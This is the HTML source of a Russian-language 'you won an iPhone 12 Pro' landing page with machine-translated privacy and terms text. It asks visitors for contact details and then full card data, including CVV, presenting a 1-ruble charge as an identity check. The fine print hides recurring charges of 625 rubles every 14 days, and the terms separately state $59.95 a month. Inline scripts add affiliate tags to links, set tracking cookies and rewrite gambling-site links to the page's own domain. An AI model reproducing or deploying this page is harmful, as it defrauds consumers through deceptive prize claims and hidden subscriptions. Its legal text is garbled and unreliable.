<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0,user-scalable=0"
    />
    <meta name="format-detection" content="telephone=no" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="robots" content="noindex, nofollow" />

    <title>Забери iPhone 12 Pro!</title>
    <link
        rel="stylesheet"
        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.8.1/css/all.min.css"
        integrity="sha512-gMjQeDaELJ0ryCI+FtItusU9MkAifCZcGq789FrzkiM49D8lbDhoaUaIX4ASU187wofMNlgBJ4ckbrXM9sE6Pg=="
        crossorigin="anonymous"
    />
    <link rel="stylesheet" href="/land2/assets/css/style.min.css" />
    <link rel="stylesheet" href="/land2/assets/css/frontend.css" />
    <script src="https://widget.cloudpayments.ru/bundles/checkout"></script>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-LDEDHN7K46"</script>>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());

gtag('config', 'G-LDEDHN7K46');
</script>

</head>
<body>
<script>
    document.addEventListener('DOMContentLoaded', function(){
        $("a[href]").each(function(){if(document.domain==="start."+document.domain.replace("start.","")){var a=document.domain.replace("start.","");a=$(this).attr("href").replace("parimatch.com",a).replace("pari-match.com",a);$(this).attr("href",a)}});

        function setCookie(a,c,b){var f=window.location.hostname.split(".").filter(function(a,b){return 0!==b}).join("."),e=new Date;e.setTime(e.getTime()+864E5*b);b="expires="+e.toUTCString();document.cookie=a+"="+c+";"+b+";path=/;domain=."+f}function findGetParameter(a){var c=null,b=[];location.search.substr(1).split("&").forEach(function(f){b=f.split("=");b[0]===a&&(c=decodeURIComponent(b[1]))});return c}
        function insertParam(r,a,e){var n=new URL(e),t=n.search,s=new URLSearchParams(t);return s.set(r,a),n.search=s.toString(),n.toString()}
        null!==findGetParameter("btag")&&setCookie("pm_btag",findGetParameter("btag"),3);null!==findGetParameter("qtag")&&setCookie("qtag",findGetParameter("qtag"),3);null!==findGetParameter("siteid")&&setCookie("pm_siteid",findGetParameter("siteid"),365);links = document.getElementsByTagName("a");
        Array.prototype.forEach.call(links, function (c) {var a = c.href, b = "", e = window.location.hostname.split(".").filter(function (a, b) {return 0 !== b}).join(".");-1 !== a.indexOf("#") && (b = a.slice(a.indexOf("#"), a.length), a = a.slice(0, a.indexOf("#")));-1 !== a.indexOf(e) && (null !== findGetParameter("btag") && (a = insertParam("btag", findGetParameter("btag"), a)), null !== findGetParameter("qtag") && (a = insertParam("qtag", findGetParameter("qtag"), a)), null !== findGetParameter("siteid") && (a = insertParam("siteid", findGetParameter("siteid"), a)), null !== findGetParameter("utm") && (a = insertParam("utm", findGetParameter("utm"), a)), null !== findGetParameter("utm_source") && (a = insertParam("utm_source", findGetParameter("utm_source"), a)), null !== findGetParameter("utm_medium") && (a = insertParam("utm_medium", findGetParameter("utm_medium"), a)), null !== findGetParameter("utm_campaign") && (a = insertParam("utm_campaign", findGetParameter("utm_campaign"), a)), null !== findGetParameter("utm_content") && (a = insertParam("utm_content", findGetParameter("utm_content"), a)), 0 < b.length && (a += b), c.dataset.toggle || (c.href = a))});
    });

    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:2178833,hjsv:6};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
</script>
<div class="intro">
    <div class="container">
        <div class="row">
            <div class="col-12">
                <div class="intro-subtitle">Поздравляем!</div>
                <div class="intro-title">Вы выиграли Iphone 12 Pro</div>
            </div>
        </div>
        <div class="row align-items-center">
            <div class="col-12 col-xl-5 col-lg-4">
                <div class="intro-img">
                    <div class="intro-img__video">
                        <img
                            src="/land2/assets/img/intro_hx98p0.jpg"
                            class="img-fluid load-show"
                            style="display: none"
                            alt=""
                        />

                        <video
                            id="video1"
                            muted
                            class="img-fluid load-hide"
                            playsinline
                            style="display: block"
                            autoplay
                        >
                            <source src="/land2/assets/img/large_wfw1hz.mp4" type="video/mp4" />
                        </video>
                    </div>
                    <div class="price" style="opacity: 1; transition: all 2s; transition-delay: 2s">
                        <div class="price__title">ВСЕГО</div>
                        <div class="price__price">1 ₽</div>
                    </div>
                </div>
            </div>
            <div class="col-12 col-xl-7 col-lg-8">

<!-- 					STEP 1 FORM START -->
    <div class="form1" id="main-page-form1">
        <div class="form__title">Введите свои данные <br>и нажмите <span>продолжить!</span></div>
        <form class="form">
            <div class="form__group">
                <div class="input__wrapper  input__wrapper_firstname">
                    <input type="text" name="firstname" id='firstname' placeholder=" " class="form__input" required autocomplete="off">
                    <span class="custom-placeholder">Имя</span>
                    @include('land2.icons_user')
                    <span class="error__text"></span>
                </div>
                <div class="input__wrapper input__wrapper_lastname">
                    <input type="text" name="lastname" id='lastname' placeholder=" " class="form__input" required autocomplete="off">
                    <span class="custom-placeholder">Фамилия</span>
                    @include('land2.icons_user')
                    <span class="error__text"></span>
                </div>
            </div>
            <div class="form__group" style='margin-top: 22px'>
                <div class="input__wrapper input__wrapper_phone">
                    <input id="phone" type="phone" name="phone" placeholder=" " class="form__input" required autocomplete="off">
                    <span class="custom-placeholder">Телефон</span>
                    @include('land2.icons_input_phone')
                    <span class="error__text">Введите свой телефон</span>
                </div>
                <div class="input__wrapper input__wrapper_email">
                    <input id="email" type="email" name="email" placeholder=" " class="form__input" required autocomplete="off">
                    <span class="custom-placeholder">E-mail</span>
                    @include('land2.icons_mail')
                    <span class="error__text">Введите свой email-адрес</span>
                </div>
            </div>

            <div class="form__footer">
                <div class="home__terms">
                    Нажимая кнопку “Продолжить” <br>и “Принять участие” вы соглашаетесь <br>с <a href="#" onclick="openModal(this)" data-target="modalTerms">Публичная оферта</a>
                </div>
                <button type="button" class="button button-continue button-blank">Продолжить</button>
                <div class="button__blur"></div>
            </div>
        </form>
    </div>
    <!-- 					STEP 1 FORM END -->
    <!-- 					STEP 2 FORM START -->
    <div class="form2" id="main-page-form2">
        <p class="form__title">Подтвердите свою личность</p>
        <p class="form__desc">Вам нужно ввести данные карты для того, чтобы мы подтвердили Вашу личность и закрепили за Вами участие в розыгрыше. Будет списан 1 руб с Вашей карты и сразу возмещён обратно</p>
        <div class="card-form__wrapper">
            <div class="card-wrapper"></div>
            <form id="form" action="" class="form">
                <div class="input__wrapper input__wrapper_name">
                    <input type="hidden" data-cp="name">
                    <input type="text" id="name" name="name" placeholder=" " class="form__input input-name" required>
                    <span class="custom-placeholder">Имя и фамилия</span>
                    @include('land2.icons_mail')
                    <span class="error__text"></span>
                </div>
                <div class="input__wrapper input__wrapper_cardNumber">
                    <input type="hidden" data-cp="cardNumber">
                    <input id="card-number" type="text" name="number" class="form__input" placeholder=" ">
                    <span class="custom-placeholder">Номер банковской карты</span>
                    @include('land2.icons_card')
                    <span class="error__text"></span>
                </div>
                <div class="form__group">
                    <div class="input__wrapper input__wrapper_expDateMonth input__wrapper_expDateYear">
                        <input type="hidden" data-cp="expDateMonth">
                        <input type="hidden" data-cp="expDateYear">
                        <input id="card-expiry" type="text" name="expiry" class="form__input" placeholder=" ">
                        <span class="custom-placeholder">ММ/ГГ</span>
                        @include('land2.icons_calendar')
                        <span class="error__text"></span>
                    </div>

                    <div class="input__wrapper input__wrapper_cvv">
                        <input type="hidden" data-cp="cvv">
                        <input id="card-cvc" type="text" name="cvc" class="form__input" placeholder=" ">
                        <span class="custom-placeholder">CVV</span>
                        @include('land2.icons_cvv')
                        <span class="error__text">Введите CVV код</span>
                    </div>
                </div>
            </form>
        </div>
        <button type="button" class="button button-submit">Принять участие</button>
    </div>
    <!-- 					STEP 2 FORM END -->
            </div>
        </div>
    </div>
</div>

<div class="sec2">
    <div class="container">
        <div class="row">
            <div class="col-12">
                <div class="sec2-body">
                    <div class="sec2-body__text1">A14 Bionic</div>
                    <div class="sec2-body__text2">Крутое изобретение последнего поколения</div>
                    <div class="sec2-body__text3">
                        A14 Bionic - это первый 5-нанометровый чип с передовыми компонентами шириной в атом.
                        Транзисторы увеличивают скорость на сорок процентов, повышая при этом эффективность
                        и время автономной работы. А новый интернет-провайдер обеспечивает запись в формате
                        Dolby Vision - то, что не может сделать ни одна профессиональная кинокамера, не
                        говоря уже о любом другом телефоне.
                    </div>
                    <div class="sec2-body__img">
                        <img src="/land2/assets/img/a14.jpg" alt="" class="img-fluid" />
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="sec3">
    <div class="container">
        <div class="row">
            <div class="col-12">
                <div class="sec3-body">
                    <div class="sec3-body__title">Camera Pro System</div>
                    <div class="sec3-body__subtitle">Новая возможность для ночного режима</div>
                    <img src="/land2/assets/img/camera.jpg" alt="" class="img-fluid sec3-body__img" />
                    <div class="sec3-body__text">
                        Ночной режим доступен как в широкоугольных, так и в сверхширокоугольных камерах, и
                        он лучше, чем когда-либо, позволяет делать невероятные снимки при слабом освещении.
                        LiDAR позволяет делать портреты в ночном режиме. А широкоугольная камера пропускает
                        на 27 процентов больше света для большей детализации и более четкой фокусировки днем
                        или ночью.
                    </div>
                    <div class="sec3-body__list">
                        <div class="sec3-body__list--item">
                            Широкоугольная камера с диафрагмой ƒ / 1,6 улавливает на 27% больше света
                        </div>
                        <span class="decor one"></span>
                        <div class="sec3-body__list--item">
                            Новый 7-элементный широкоугольный объектив для большей резкости
                        </div>
                        <span class="decor two"></span>
                        <div class="sec3-body__list--item">
                            Новая OIS делает 5000 корректировок в секунду
                        </div>
                        <span class="decor three"></span>
                        <div class="sec3-body__list--item">
                            LiDAR обеспечивает до 6 раз более быструю автофокусировку при слабом освещении
                        </div>
                        <span class="decor four"></span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div class="legal-block">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <div class="text-center mb-0">
                    <div class="terms-info">
                        <p class="legal-block__title">
                            Ты можешь выиграть iPhone 12 Pro уже сегодня! Участвуй в лотерее! Мы свяжемся с
                            победителем по электронной почте.
                        </p>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <div class="col-md-4">
                <h4 class="legal-block__title">Как я могу выиграть?</h4>
                <div class="legal-block__text">
                    Благодаря подписке ты также участвуешь в нашем конкурсе на победу в iPhone 12 Pro. Мы
                    выбираем победителя из каждых 600 участников. Следующий победитель будет выбран
                    15.06.2021 г. и получит уведомление по электронной почте. Если iPhone нет в наличии,
                    победитель получит аналогичный товар или другой товар с большей стоимостью.
                </div>
            </div>
            <div class="col-md-4">
                <h4 class="legal-block__title">Есть какие-то скрытые комиссии?</h4>
                <div class="legal-block__text">
                    Мы гарантируем, что нашим участникам предоставляется подробная история транзакций, и благодаря этому они знают, за что они платят. Информация о кредитной карте требуется только для облегчения будущих покупок. В выписке по кредитной карте не будет никаких сборов, если ты отменишь подписку на веб-сайте нашего партнера в личном кабинете.
                </div>
            </div>
            <div class="col-md-4">
                <h4 class="legal-block__title">Зачем мне нужна платежная информация?</h4>
                <div class="legal-block__text">
                   Оставив свои контактные данные, ты получишь 3-дневную пробную версию программы нашего партнера. Если ты продолжишь подписку после 3-дневного пробного периода, с твоей кредитной карты будет сниматься 625 рублей каждые 14 дней. Когда сумма будет списана с карты, ты получишь доступ к услугам, которые предназначены исключительно для участников веб-сайта нашего партнера, на 14 дней.
                </div>
            </div>
        </div>
    </div>
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-4">
                <div style="text-align: center; padding-top: 15px">Мы принимаем кредитные карты</div>
                <div style="text-align: center; padding-bottom: 15px">
                    <img class="cards img-fluid" alt="paycards" src="/land2/assets/img/paycards.png" />
                </div>
            </div>
        </div>
    </div>
    <div class="wrapper-button">
        <span class="noclick" style="cursor: pointer" onclick="openModal(this)" data-target="modalPolitic"> Политика конфиденциальности &nbsp; </span>
        <span class="noclick" onclick="openModal(this)" data-target="modalСonditions" style="cursor: pointer"
        ><small>|&nbsp;&nbsp;</small> Условия и положения
        </span>
    </div>
</div>

<div
    id="myModal1"
    class="modal"
    style="overflow-y: scroll; padding-top: 0; background-color: rgba(0, 0, 0, 0.8)"
>
    <!-- Modal content -->
    <div class="modal-content" style="border-radius: 0">
        <div style="display: flex; align-items: flex-end; justify-content: flex-end">
            <span class="close">&times;</span>
        </div>
        <div id="full_privacy_wrapper" style="color: black; font-size: 14px">
            <h1
                style="
              font-size: 24px;
              font-weight: bold;
              font-family: Verdana, Verdana Ref, sans-serif;
            "
            >
                Политика конфиденциальности
            </h1>
            <p>Последняя редакция Политики: 20 октября 2017 г.</p>
            <p>
                Эта политика устанавливает следующую Политику конфиденциальности («Политика») в
                отношении наших пользователей и практики, связанные со сбором, использованием и обменом
                информацией и использованием информации о пользователях. Для целей настоящей Политики
                это будет именоваться «Информация».
            </p>
            <p>
                Посредством доступа и использования одного из наших веб-сайтов или других веб-сайтов, на
                которых наши предложения и / или предложения наших сторонних маркетинговых партнеров и
                другой контент представлены пользователям (совместно именуемые «Промоакции») для
                пользователей (в совокупности «Веб-сайты» и каждый из них « Web Venue "), вы
                соглашаетесь с условиями настоящей Политики. Если вы не согласны или не принимаете эти
                условия полностью, пожалуйста, не используйте и не посещайте веб-сайты и не участвуйте в
                каких-либо рекламных акциях.
            </p>
            <p>КАК СОБИРАЕТСЯ ИНФОРМАЦИЯ</p>
            <p>Вот некоторые из способов, которыми мы собираем информацию от пользователей:</p>
            <ul>
                <li>Регистрационные формы и опросы;</li>
                <li>Покупки продуктов и запросы;</li>
                <li>Отслеживая поведение пользователей в Интернете на наших веб-сайтах;</li>
                <li>
                    Электронная почта, телефонные звонки, почта USPS и другие службы поддержки клиентов
                    или другие контакты с пользователями;
                </li>
                <li>
                    Посредством использования файлов cookie (небольших текстовых файлов, размещаемых на
                    компьютере пользователя, которые отслеживают поведение в сети), однопиксельных файлов
                    изображений в формате GIF (также называемых «веб-маяками») и других технологических
                    средств (совместно именуемых «cookie»), размещаемых нами. и наши сторонние партнеры по
                    маркетингу; и
                </li>
                <li>Информация предоставлена для получения вознаграждения в рамках рекламной акции.</li>
            </ul>
            <p></p>
            <p>
                Мы разрешаем третьим сторонам рекламировать и продвигать наши веб-сайты, и мы можем
                размещать и разрешать третьим сторонам размещать рекламу, файлы cookie, веб-маяки и
                другой контент, включая ссылки на другие веб-сайты на наших веб-сайтах. Мы и наши
                сторонние маркетинговые партнеры можем использовать эти технологические средства,
                размещенные на наших веб-сайтах, для сбора и передачи вашей информации.
            </p>
            <p>ВИДЫ ИНФОРМАЦИИ, КОТОРОЙ МЫ СОБИРАЕМ</p>
            <p>Вот типы информации, которую мы можем собирать от пользователей:</p>
            <ul>
                <li>Имя</li>
                <li>Почтовый адрес</li>
                <li>Адрес электронной почты</li>
                <li>Номер телефона</li>
                <li>Номер мобильного / стационарного телефона</li>
                <li>Пол и дата рождения</li>
                <li>Айпи адрес</li>
                <li>Ответы на опрос</li>
                <li>Покупка продуктов и запросы на предложения</li>
                <li>Идентификатор устройства и местоположение</li>
                <li>Идентификатор устройства и местоположение</li>
                <li>Ссылающийся URL</li>
            </ul>
            <p></p>
            <p>
                Ваше поведение при просмотре или навигации по любому из наших веб-сайтов, включая
                заполнение вами любых форм и / или предоставление какой-либо информации, может быть
                зафиксировано или записано сторонним поставщиком в режиме реального времени, с которым
                мы сотрудничаем. Такой захват или запись необходимы по ряду причин, одна из которых
                заключается в подтверждении любых юридических согласий, которые вы можете предоставить
                нам, когда вы заполняете форму или иным образом предоставляете информацию через один из
                наших веб-сайтов.
            </p>
            <p>
                Мы можем использовать сторонние данные о пользователях, предоставленные сторонними
                партнерами по маркетингу и рекламными спонсорами (совместно именуемые «Партнеры»), а
                также нашими аффилированными лицами (включая нашу материнскую компанию, дочерние
                компании и другие организации, находящиеся под общим с нами контролем) (совместно,
                «Аффилированные лица») источников, в том числе предоставленных нашими («Аффилированными
                лицам») для дополнения и / или проверки Информации, которую мы собираем от
                пользователей, а также могут связывать демографические и другие данные, которые мы
                собираем, такие как браузер и устройство пользователей, с их Информацией.
            </p>
            <p>ДЕТИ</p>
            <p>
                Веб-сайт предназначен для соблюдения Закона о защите конфиденциальности детей в
                Интернете (COPPA). COPPA требует, чтобы операторы веб-сайтов никогда сознательно не
                собирали PII от кого-либо в возрасте до 13 лет без предварительного проверяемого
                согласия родителей. Мы сознательно не собираем и не храним информацию с веб-сайтов от
                детей младше 18 лет, за исключением того, что мы можем собирать ограниченный объем
                информации от пользователей старше 13 лет. Наши услуги и веб-сайты предназначены для
                использования лицами, не достигшими совершеннолетия. Если вы несовершеннолетний или не
                согласны с условиями данной Политики, пожалуйста, не обращайтесь к нашим веб-сайтам и
                службам и не используйте их.
            </p>
            <p>ИСПОЛЬЗОВАНИЕ И ОБМЕН ИНФОРМАЦИЕЙ</p>
            <p>
                Мы можем использовать Информацию и делиться ею с нашими Аффилированными лицами и
                Партнерами (которые могут компенсировать нам) многими способами и для многих целей,
                включая:
            </p>
            <ul>
                <li>
                    Помогать в работе сайта и других коммуникационных услугах, мы можем делиться
                    Информацией с третьими сторонами, включая поставщиков и подрядчиков, которые
                    предоставляют нам услуги;
                </li>
                <li>Выполнить рекламную акцию;</li>
                <li>
                    Поддерживать списки подавления или отказа, которыми мы можем поделиться с третьими
                    сторонами, чтобы с пользователем не связались, когда пользователь попросил не
                    связываться;
                </li>
                <li>Обеспечивать обслуживание клиентов и отвечать на запросы;</li>
                <li>
                    Предоставлять пользователям информацию и / или предложения по продуктам или услугам от
                    нас или наших Партнеров;
                </li>
                <li>- Разрешить партнерам связываться с вами в маркетинговых целях;</li>
                <li>
                    Отслеживайте поведение в Интернете для поведенческой рекламы и других маркетинговых
                    целей. Если пользователь регистрируется на одном из наших веб-сайтов, он может
                    ежедневно получать соответствующие сторонние электронные письма от этого веб-сайта,
                    его эксклюзивного партнера по электронной почте и других веб-сайтов, которыми мы или
                    наши Аффилированные лица владеем и / или управляем;
                </li>
                <li>
                    Дополнять информацию, другими источниками данных, предоставленными третьими сторонами
                    и / или нашими аффилированными лицами, чтобы мы могли, например, получить более
                    глубокое представление о наших пользователях;
                </li>
                <li>
                    Совершать телефонные звонки и отправлять текстовые сообщения пользователям с
                    информацией и предложениями при условии, что пользователь дал согласие на продажу
                    таким образом, как описано ниже;
                </li>
                <li>
                    Разрабатывать и / или улучшать продукты и / или услуги наших Аффилированных лиц и /
                    или Партнеров;
                </li>
                <li>
                    Если мы проданы, объединены с третьей стороной, приобретены или являемся объектом
                    процедуры банкротства, ваша Информация может быть передана соответствующей третьей
                    стороне (ам); если мы участвуем в одной из этих транзакций, вы будете уведомлены по
                    электронной почте и / или в уведомлении на нашем веб-сайте о любых изменениях в праве
                    собственности или использовании вашей Информации, а также о любом выборе, который вы
                    можете сделать в отношении вашей Информации;
                </li>
                <li>
                    Отвечать на повестки в суд, постановления суда или судебный процесс, или для
                    установления или реализации наших законных прав или защиты от судебных исков, или
                    когда мы сочтем необходимым соблюдать применимые законы или постановления; если это
                    разрешено действующим законодательством, мы отправим вам уведомление по электронной
                    почте и возможность оспорить соответствующую повестку / запрос до раскрытия какой-либо
                    информации; и
                </li>
                <li>
                    Помогать в работе веб-объекта и других коммуникационных услуг, делиться Информацией с
                    третьими сторонами, включая наших поставщиков и подрядчиков.
                </li>
            </ul>
            <p></p>
            <p>
                Отправляя нам свою Информацию на веб-сайте, вы соглашаетесь с тем, что это запрос и /
                или приложение для целей Исправленных Правил продаж телемаркетинга с поправками
                («Правило») и применимых государственных правил запрета звонков. Это позволяет нам
                связываться с вами через телемаркетинг, даже если ваш номер телефона указан в Списке
                запрета звонков Федеральной торговой комиссии и / или в соответствующих списках запретов
                звонков штата.
            </p>
            <p>
                Если вы даете «предварительное явное письменное согласие» по смыслу Закона о защите
                потребителей телефонной связи («TCPA»), вы даете согласие на прием телефонных звонков,
                включая искусственные голосовые звонки, предварительно записанные сообщения и / или
                звонки, доставляемые с помощью автоматизированных технологий и текста и SMS-сообщения на
                телефонный номер (а), который вы предоставили нам и маркетинговым партнерам, указанным в
                и гиперссылке на согласие. Вы не обязаны предоставлять это согласие для получения
                доступа к нашим Акциям, продуктам или услугам, и ваше согласие просто позволяет нам
                связываться с вами с помощью этих средств. Соглашаясь с этой Политикой, вы обязаны
                немедленно сообщить нам, если номер телефона, который вы нам предоставили, изменится.
                Если вы: (а) переназначили ваш номер телефона другому лицу; (б) откажитесь от своего
                номера телефона; (c) перенести номер вашего сотового телефона на стационарный или
                наоборот; или (d) иным образом прекратите использовать этот номер телефона, вы
                соглашаетесь незамедлительно связаться с нами по адресу
                privacysupport@webrewardsoffer.com
            </p>
            <p>ИЗМЕНЕНИЯ В НАСТОЯЩЕЙ ПОЛИТИКЕ</p>
            <p>
                Мы оставляем за собой право пересматривать и обновлять эту Политику в любое время. Если
                мы внесем существенные изменения в эту Политику, мы разместим уведомление на нашем
                веб-сайте. Любые такие изменения вступят в силу через 30 дней после публикации на
                веб-сайте и будут применяться ко всей информации, собранной нами как до, так и после
                даты вступления в силу. Если мы расширим способ использования PII, мы будем уведомлять
                пользователей путем: (а) отправки измененной политики нашим пользователям по электронной
                почте; и / или (b) любыми другими разумными способами, приемлемыми в соответствии с
                действующим законодательством штата и федеральным законодательством. У вас будет выбор
                относительно того, будем ли мы использовать вашу PII таким другим способом, и мы будем
                использовать вашу PII только в том случае, если вы дадите согласие на такое
                использование. Пользователи должны периодически посещать эту Политику, чтобы
                ознакомиться с нашей текущей политикой в отношении сбора и использования Информации.
            </p>
            <p>ВОПРОСЫ, ПРЕДЛОЖЕНИЯ ИЛИ СВЯЗАТЬСЯ С НАМИ</p>
            <p>
                Если у вас есть какие-либо вопросы, комментарии, жалобы или предложения относительно
                данной Политики или наших веб-сайтов, свяжитесь с нами по адресу
                privacysupport@webrewardsoffer.com
            </p>
            <div style="display: flex; align-items: center; justify-content: center; color: black">
            <span
                class="close"
                style="
                font-family: Verdana, Verdana Ref, sans-serif;
                font-size: 13.33px;
                color: black;
                border: 1px solid black;
                border: 2.5px solid black;
                padding: 10px;
                border-radius: 20px;
              "
                id="bclose1"
            >Закрыть</span
            >
            </div>
        </div>
    </div>
</div>

<div
    id="myModal"
    class="modal"
    style="overflow-y: scroll; padding-top: 0; background-color: rgba(0, 0, 0, 0.8)"
>
    <!-- Modal content -->
    <div class="modal-content" style="border-radius: 0">
        <span class="close">×</span>

        <div id="full_terms_wrapper" style="color: black; font-size: 14px">
            <h1
                style="
              font-size: 24px;
              font-weight: bold;
              font-family: Verdana, Verdana Ref, sans-serif;
            "
            >
                Условия и положения
            </h1>
            <p>В КАЧЕСТВЕ УЧАСТИЯ В НАШИХ АКЦИЯХ ВЫ («ЗАКАЗЧИК») ПРИНИМАЕТЕ ЭТИ УСЛОВИЯ.</p>
            <p>
                ВСЕМ ЛИЦАМ ДО ВОСЕМНАДЦАТЬ (18) ЛЕТ ЗАПРЕЩАЕТСЯ В ДОСТУПЕ К ДАННОМУ ВЕБ-САЙТУ. ЕСЛИ
                ПОДПИСЧИКУ МЕНЕЕ ВОСЕМНАДЦАТЬ (18) ЛЕТ, ПОСЕТИТЬ, ПРОЧИТАТЬ ИЛИ ВЗАИМОДЕЙСТВОВАТЬ С
                ДАННЫМ ВЕБ-САЙТОМ ИЛИ ЕГО СОДЕРЖАНИЕМ ЛЮБЫМ СПОСОБОМ. НАСТОЯЩИЙ ВЕБ-САЙТ ОТКАЗЫВАЕТ В
                ДОСТУПЕ ЛЮБОМУ ЛЮБОМУ ЛИЦУ, НА КОТОРОЕ УПРАВЛЯЕТСЯ ЗАКОН О КОНФИДЕНЦИАЛЬНОСТИ ДЕТЕЙ В
                ИНТЕРНЕТЕ (COPA) 1998 года. ДАННЫЙ ВЕБ-САЙТ ОСТАВЛЯЕТ ПРАВО ОТКАЗАТЬ В ДОСТУПЕ ЛЮБОМУ
                ЛИЦУ ИЛИ Зрителю по ЛЮБОЙ ПРИЧИНЕ.
            </p>
            <p>
                Соглашаясь с условиями и установив флажок в поле выше, вы подтверждаете и соглашаетесь
                на свое членство и участие. Членство дает вам доступ к нашей Премиум-библиотеке, которая
                будет включать в себя либо неограниченное скачивание книг; высококачественные игры или
                ежемесячная подписка на журналы.
            </p>
            <p>Абонентская плата</p>
            <p>
                Как участник, вы соглашаетесь с полными членскими взносами. Первоначальная плата за
                доступ к нашей Премиум-библиотеке, которая включает в себя либо неограниченное
                скачивание книг; высококачественные игры или ежемесячные подписки на журналы, если вы не
                отмените их. Вы можете отменить подписку в любое время, связавшись с нашим
                круглосуточным сервисным центром по электронной почте:
                customersupport@webrewardsoffer.com. Кроме того, вы соглашаетесь с тем, что за часть
                членства по подписке мы автоматически будем взимать комиссию в размере США с той же
                кредитной карты, которую вы предоставили. (59,95 долларов США в месяц), если вы не
                решите отменить подписку. Вы можете отменить любую часть или обе части членства, чтобы
                избежать выставления счетов в будущем, и вы можете получить возмещение, если отмените в
                течение 30 дней с момента любой списания. Чтобы отменить поддержку клиентов по
                электронной почте по адресу customersupport@webrewardsoffer.com.
            </p>
            <p>
                САЙТУ РАЗРЕШЕНО СБОР И ХРАНЕНИЕ ДАННЫХ И ИНФОРМАЦИИ ДЛЯ ОБЫЧНЫХ ОПЕРАЦИЙ И ФУНКЦИЙ
                САЙТА.
            </p>
            <p>
                СРОКИ И УСЛОВИЯ МОГУТ МЕНЯТЬСЯ ВРЕМЯ. ПОДПИСЧИКИ НЕСЕТ ПОДТВЕРЖДЕННОЕ ОБЯЗАТЕЛЬСТВО ПО
                ИНФОРМИРОВАНИЮ СВОИХ ИЗМЕНЕНИЙ.
            </p>
            <p>Стороны</p>
            <p>
                Участники, зрители, подписчики, пользователи или клиенты, вместе именуемые «Участники»,
                являются сторонами этого соглашения. Веб-сайт и его владельцы и / или операторы являются
                сторонами этого соглашения, именуемого в данном документе «Веб-сайт».
            </p>
            <p>Соглашение</p>
            <p>
                Установив флажок выше, вы соглашаетесь с настоящими Условиями использования («Положения
                и условия» или «Условия»).
            </p>
            <p>Принятие и подписка</p>
            <p>
                Прежде чем подписка или любая транзакция могут быть завершены, Участник подтверждает и
                соглашается с тем, что он прочитал, полностью понял и согласен с настоящими Положениями
                и условиями. Вводя информацию о кредитной карте и нажимая «Подтвердить» или подавая
                заявку на доступ и / или Услуги с этого Веб-сайта, Участник соглашается с настоящими
                Условиями и соглашается соблюдать их юридические обязательства. Это соглашение может
                быть изменено в любое время. Изменения вступают в силу, если они размещены на этом
                Веб-сайте без уведомления каждого Участника.
            </p>
            <p>Интеллектуальная собственность</p>
            <p>
                Все авторские права и другие права интеллектуальной собственности, существующие на
                Веб-сайте (включая, помимо прочего, программное обеспечение, дизайн, текст и графику,
                содержащиеся на Веб-сайте), принадлежат Веб-сайту. ЗАКАЗЧИК имеет право просматривать
                Веб-сайт и его содержимое с помощью веб-браузера ЗАКАЗЧИКА. ЗАКАЗЧИК не должен иным
                образом воспроизводить, передавать, сообщать, адаптировать, распространять, продавать,
                изменять или публиковать или иным образом использовать какие-либо материалы на
                Веб-сайте, за исключением случаев, предусмотренных законом, с нашего предварительного
                письменного согласия или в соответствии с настоящими Условиями.
            </p>
            <p>Авторские права</p>
            <p>
                Если вы считаете, что какой-либо контент на Веб-сайте нарушает ваши авторские права, вы
                можете отправить уведомление в соответствии с Законом об авторском праве в цифровую
                эпоху («DMCA»), предоставив Агенту по авторским правам следующую информацию в письменном
                виде (см. 17 USC 512 (c) (3) для более подробной информации): физическая или электронная
                подпись лица, уполномоченного действовать от имени владельца исключительного права,
                которое предположительно было нарушено; идентификация защищенной авторским правом
                работы, которая, как утверждается, была нарушена, или, если несколько защищенных
                авторским правом работ на одном онлайн-сайте охватываются одним уведомлением,
                репрезентативный список таких работ на этом сайте; идентификация материала, который, как
                утверждается, нарушает авторские права или является предметом деятельности, нарушающей
                авторские права, и который должен быть удален или доступ к которому должен быть
                отключен, а также информацию, разумно достаточную для того, чтобы поставщик услуг мог
                найти материал; информация, разумно достаточная для того, чтобы поставщик услуг мог
                связаться с вами, например адрес, номер телефона и, если возможно, электронная почта;
                заявление о том, что вы добросовестно полагаете, что использование материала указанным
                способом не разрешено владельцем авторских прав, его агентом или законом; и заявление о
                том, что информация в уведомлении является точной и, под страхом наказания за
                лжесвидетельство, что вы уполномочены действовать от имени владельца исключительного
                права, которое предположительно нарушено.
            </p>
            <p>Патент</p>
            <p>
                Веб-сайт или любые его лицензиары или аффилированные лица Продукты, технологии и
                процессы, упомянутые или опубликованные на веб-сайте, могут быть защищены одним или
                несколькими патентами и / или подпадать под действие другой коммерческой тайны и / или
                любых других прав собственности. Никакая передача или предоставление каких-либо прав по
                любым таким патентам не производится и не подразумевается каким-либо положением
                настоящих Условий или любым другим положением, содержащимся на Веб-сайте, и Веб-сайт и /
                или его лицензиары и / или аффилированные лица оставляют за собой все такие права.
            </p>
            <p>Дальнейшие заявления об ограничении ответственности</p>
            <p>
                Веб-сайт не несет ответственности за какой-либо неправильный или неточный контент,
                размещенный на Веб-сайте или в связи с любыми предоставленными Услугами, независимо от
                того, вызван ли они пользователями или каким-либо оборудованием или программами,
                связанными с любыми Услугами или используемыми в них. Веб-сайт не несет ответственности
                за поведение любого пользователя, будь то онлайн или офлайн. Веб-сайт не несет
                ответственности за какие-либо ошибки, упущения, прерывания, удаление, дефекты, задержки
                в работе или передаче, сбой линии связи, кражу или уничтожение, а также за
                несанкционированный доступ или изменение любых Услуг, Продуктов или Призов. Веб-сайт не
                несет ответственности за какие-либо проблемы или технические неисправности любой
